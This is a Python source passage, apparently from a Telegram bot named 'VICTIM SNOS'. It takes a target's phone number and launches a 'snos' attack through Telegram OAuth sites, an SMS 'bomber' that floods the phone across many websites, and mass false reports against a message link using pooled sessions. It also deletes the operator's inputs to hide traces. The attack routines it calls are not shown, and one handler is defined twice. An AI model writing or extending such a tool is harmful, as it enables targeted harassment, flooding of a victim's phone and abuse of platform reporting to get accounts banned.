@dp.callback_query(F.data == "refresh_sessions")
async def refresh_sessions(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    if user_id in active_attacks:
        await cb.answer("Cannot refresh during attack!", show_alert=True)
        return
    
    await cb.answer(f"Refreshing {SESSIONS_PER_USER} sessions...")
    asyncio.create_task(refresh_user_sessions(user_id))

@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    sessions_count = get_user_sessions_count(user_id)
    sessions_ready = is_user_sessions_ready(user_id)
    
    await edit_message_with_banner(
        cb,
        f"<b>STATUS</b>\n\n"
        f"Sessions: {sessions_count}/{SESSIONS_PER_USER} ({'Ready' if sessions_ready else 'Loading'})\n"
        f"OAuth sites: {len(TELEGRAM_OAUTH_SITES)}\n"
        f"Bomber sites: {len(BOMBER_WEBSITES)}",
        InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="BACK", callback_data="main_menu")]])
    )

@dp.callback_query(F.data == "snos")
async def snos_start(cb: types.CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    
    if not await check_channel_subscription(user_id):
        await cb.answer("Subscribe first!", show_alert=True)
        return
    
    if not is_user_sessions_ready(user_id):
        await cb.answer("Sessions loading!", show_alert=True)
        return
    if user_id in active_attacks:
        await cb.answer("Attack in progress!", show_alert=True)
        return
    
    await state.set_state(SnosState.waiting_phone)
    await cb.message.delete()
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption="<b>SNOS NUMBER</b>\n\nEnter phone (+79001234567):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="snos_menu")]])
        )
    else:
        await cb.message.answer(
            "<b>SNOS NUMBER</b>\n\nEnter phone (+79001234567):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="snos_menu")]])
        )

@dp.message(StateFilter(SnosState.waiting_phone))
async def snos_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(SnosState.waiting_count)
    
    # Удаляем номер из сообщения сразу
    await msg.delete()
    st = await send_message_with_banner(msg, "Enter rounds (1-10):")
    # Сохраняем ID сообщения для удаления позже
    await state.update_data(status_msg_id=st.message_id)

@dp.message(StateFilter(SnosState.waiting_count))
async def snos_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 10:
            return
    except:
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    await state.clear()
    
    # Удаляем сообщение с количеством раундов
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_attacks[user_id] = {"stop_event": stop_event, "task": None}
    
    st = await send_message_with_banner(msg, f"<b>SNOS STARTED</b>")
    
    async def prog(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>SNOS</b>\n\nRound: {cur}/{tot}")
        except:
            pass
    
    task = asyncio.create_task(snos_attack(user_id, phone, count, stop_event, prog))
    active_attacks[user_id]["task"] = task
    
    try:
        results, ok = await task
    except asyncio.CancelledError:
        results, ok = [], 0
    
    asyncio.create_task(refresh_user_sessions(user_id))
    
    # Удаляем статусное сообщение
    await st.delete()
    
    if user_id in active_attacks:
        del active_attacks[user_id]
    
    # Чистим все следы номера
    await send_message_with_banner(msg, "<b>SNOS COMPLETED</b>", get_main_menu())

@dp.callback_query(F.data == "bomber")
async def bomber_start(cb: types.CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    
    if not await check_channel_subscription(user_id):
        await cb.answer("Subscribe first!", show_alert=True)
        return
    
    if user_id in active_bombers:
        await cb.answer("Bomber in progress!", show_alert=True)
        return
    
    await state.set_state(BomberState.waiting_phone)
    await cb.message.delete()
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption=f"<b>BOMBER</b>\n\nSites: {len(BOMBER_WEBSITES)}\n\nEnter phone:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="bomber_menu")]])
        )
    else:
        await cb.message.answer(
            f"<b>BOMBER</b>\n\nSites: {len(BOMBER_WEBSITES)}\n\nEnter phone:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Cancel", callback_data="bomber_menu")]])
        )

@dp.message(StateFilter(BomberState.waiting_phone))
async def bomber_phone(msg: types.Message, state: FSMContext):
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    await state.update_data(phone=phone)
    await state.set_state(BomberState.waiting_count)
    await msg.delete()
    await send_message_with_banner(msg, "Enter rounds (1-5):")

@dp.message(StateFilter(BomberState.waiting_count))
async def bomber_count(msg: types.Message, state: FSMContext):
    try:
        count = int(msg.text.strip())
        if count < 1 or count > 5:
            return
    except:
        return
    
    data = await state.get_data()
    phone = data["phone"]
    user_id = msg.from_user.id
    await state.clear()
    
    await msg.delete()
    
    stop_event = asyncio.Event()
    active_bombers[user_id] = {"stop_event": stop_event, "task": None}
    
    st = await send_message_with_banner(msg, f"<b>BOMBER STARTED</b>")
    
    async def prog(cur, tot, ok_count):
        try:
            await st.edit_caption(caption=f"<b>BOMBER</b>\n\nRound: {cur}/{tot}")
        except:
            pass
    
    task = asyncio.create_task(bomber_attack(phone, count, user_id, stop_event, prog))
    active_bombers[user_id]["task"] = task
    
    try:
        results, ok = await task
    except asyncio.CancelledError:
        results, ok = [], 0
    
    await st.delete()
    
    if user_id in active_bombers:
        del active_bombers[user_id]
    
    await send_message_with_banner(msg, "<b>BOMBER COMPLETED</b>", get_main_menu())

@dp.callback_query(F.data.startswith("reason_"))
async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
    reason = cb.data.replace("reason_", "")
    data = await state.get_data()
    link = data["link"]
    user_id = cb.from_user.id
    await state.clear()
    
    await cb.message.delete()
    
    active_reports[user_id] = True
    
    if os.path.exists(BANNER_PATH):
        st = await cb.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption="<b>REPORTING...</b>"
        )
    else:
        st = await cb.message.answer("<b>REPORTING...</b>")
    
    async def prog(reported):
        try:
            if os.path.exists(BANNER_PATH):
                await st.edit_caption(caption=f"<b>REPORTING</b>\n\nSent: {reported}")
            else:
                await st.edit_text(f"<b>REPORTING</b>\n\nSent: {reported}")
        except:
            pass
    
    ok, error = await mass_report_message(user_id, link, reason, prog)
    
    await st.delete()
    
    if user_id in active_reports:
        del active_reports[user_id]
    
    if error:
        await cb.message.answer(f"<b>ERROR</b>\n\n{error}")
    else:
        await cb.message.answer(f"<b>REPORT SENT</b>")
    
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(
            FSInputFile(BANNER_PATH),
            caption="<b>VICTIM SNOS</b>",
            reply_markup=get_main_menu()
        )
    else:
        await cb.message.answer("<b>VICTIM SNOS</b>", reply_markup=get_main_menu())

@dp.message(StateFilter(ReportMessageState.waiting_link))
async def report_msg_link(msg: types.Message, state: FSMContext):
    link = msg.text.strip()
    await state.update_data(link=link)
    await state.set_state(ReportMessageState.waiting_reason)
    await msg.delete()
    
    # Отправляем новое сообщение с выбором причины
    if os.path.exists(BANNER_PATH):
        await msg.answer_photo(
            FSInputFile(BANNER_PATH),
            caption="<b>SELECT REASON</b>",
            reply_markup=get_report_reason_menu()
        )
    else:
        await msg.answer("<b>SELECT REASON</b>", reply_markup=get_report_reason_menu())

async def edit_message_with_banner_msg(msg: types.Message, text: str, markup=None):
    if os.path.exists(BANNER_PATH):
        await msg.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        await msg.answer(text, reply_markup=markup)

@dp.callback_query(F.data.startswith("reason_"))
async def report_msg_reason(cb: types.CallbackQuery, state: FSMContext):
    reason = cb.data.replace("reason_", "")
    data = await state.get_data()
    link = data["link"]
    user_id = cb.from_user.id
    await state.clear()
    
    await cb.message.delete()
    
    active_reports[user_id] = True
    
    st = await cb.message.answer_photo(
        FSInputFile(BANNER_PATH) if os.path.exists(BANNER_PATH) else None,
        caption=f"<b>REPORTING...</b>" if os.path.exists(BANNER_PATH) else "<b>REPORTING...</b>"
    )
    
    async def prog(reported):
        try:
            await st.edit_caption(caption=f"<b>REPORTING</b>\n\nSent: {reported}")
        except:
            pass
    
    ok, error = await mass_report_message(user_id, link, reason, prog)
    
    await st.delete()
    
    if user_id in active_reports:
        del active_reports[user_id]
    
    if error:
        await cb.message.answer(f"<b>ERROR</b>\n\n{error}")
    else:
        await cb.message.answer(f"<b>REPORT SENT</b>")
    
    await send_message_with_banner_cb(cb, "<b>VICTIM SNOS</b>", get_main_menu())

async def send_message_with_banner_cb(cb: types.CallbackQuery, text: str, markup=None):
    if os.path.exists(BANNER_PATH):
        await cb.message.answer_photo(FSInputFile(BANNER_PATH), caption=text, reply_markup=markup)
    else:
        await cb.message.answer(text, reply_markup=markup)

@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    
    if user_id in active_attacks:
        active_attacks[user_id]["stop_event"].set()
        if active_attacks[user_id]["task"]:
            active_attacks[user_id]["task"].cancel()
        del active_attacks[user_id]
    
    if user_id in active_bombers:
        active_bombers[user_id]["stop_event"].set()
        if active_bombers[user_id]["task"]:
            active_bombers[user_id]["task"].cancel()
        del active_bombers[user_id]
    
    if user_id in active_reports:
        del active_reports[user_id]
    
    await edit_message_with_banner(cb, "<b>STOPPED</b>", get_main_menu())


# ---------- ЗАПУСК ----------
async def main():
    load_allowed_users()
    logger.info(f"VICTIM SNOS starting... Sessions: {SESSIONS_PER_USER}")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
